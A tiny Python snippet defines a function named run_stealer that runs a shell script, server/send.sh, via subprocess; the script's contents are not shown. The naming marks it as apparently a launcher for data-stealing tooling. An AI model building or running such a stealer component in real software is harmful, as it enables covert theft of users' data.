import subprocess

def run_stealer():
    result = subprocess.run(
        ["bash", "server/send.sh"],
        check=True, 
    )